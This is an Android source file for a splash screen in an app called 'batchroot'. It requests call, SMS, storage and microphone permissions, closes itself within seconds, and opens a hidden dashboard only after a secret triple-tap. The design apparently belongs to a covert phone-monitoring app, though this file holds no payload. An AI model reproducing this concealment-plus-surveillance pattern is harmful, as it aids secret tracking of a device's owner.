package root.ackla.com.batchroot;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.Nullable;
import android.view.MotionEvent;

import com.gun0912.tedpermission.PermissionListener;
import com.gun0912.tedpermission.TedPermission;

import java.util.ArrayList;

import root.ackla.com.batchroot.gui.DashboardActivity;

/**
 * Created by ankurrawal on 14/9/17.
 */

public class SplashActivity extends Activity {
    private Context mContext;
    private long SPLASH_END_TIME = 1000 * 5; // 5 seconds

    private int count = 0;
    private long startMillis = 0;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mContext = this;

        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP) {
            // only for gingerbread and newer versions
//            Intent intent = new Intent(mContext, MainService.class);
//            startService(intent);
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    SplashActivity.this.finish();
                }
            }, SPLASH_END_TIME);
        } else {
            checkIfPermissionGranted();
        }


//        if (!isTaskRoot()
//                && getIntent().hasCategory(Intent.CATEGORY_LAUNCHER)
//                && getIntent().getAction() != null
//                && getIntent().getAction().equals(Intent.ACTION_MAIN)) {
//
//            finish();
//            return;
//        }
//

    }

    private void checkIfPermissionGranted() {

        TedPermission.with(this)
                .setPermissionListener(new PermissionListener() {
                    @Override
                    public void onPermissionGranted() {
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                SplashActivity.this.finish();
                            }
                        }, 500);

                    }

                    @Override
                    public void onPermissionDenied(ArrayList<String> arrayList) {
                    }
                })
                .setDeniedMessage("Please enbale all the permissions to access this application")
                .setGotoSettingButton(true)
                .setPermissions(Manifest.permission.READ_PHONE_STATE, Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.RECORD_AUDIO)
                .check();

    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {

        int eventaction = event.getAction();
        if (eventaction == MotionEvent.ACTION_UP) {

            //get system current milliseconds
            long time = System.currentTimeMillis();


            //if it is the first time, or if it has been more than 5 seconds since the first tap ( so it is like a new try), we reset everything
            if (startMillis == 0 || (time - startMillis > 5000)) {
                startMillis = time;
                count = 1;
            }
            //it is not the first, and it has been  less than 3 seconds since the first
            else { //  time-startMillis< 3000
                count++;
            }

            if (count == 3) {
                //do whatever you need
                Intent intent = new Intent(this, DashboardActivity.class);
                startActivity(intent);
            }
            return true;
        }
        return false;
    }
}
